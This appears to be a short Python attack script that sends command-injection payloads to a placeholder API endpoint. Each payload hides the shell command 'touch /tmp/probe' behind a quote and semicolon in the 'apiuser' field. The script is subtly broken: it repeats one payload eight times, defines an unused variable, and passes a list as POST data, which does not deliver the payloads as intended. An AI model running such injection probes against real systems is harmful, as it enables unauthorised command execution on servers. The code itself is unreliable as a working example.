import requests
url = "https://example.invalid/accessv2"
quotes = {"apiuser": "''''"}
payloads = ['{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}',
'{"apiuser":"\'; touch /tmp/probe; #"}']
requests.post(url, data=payloads)
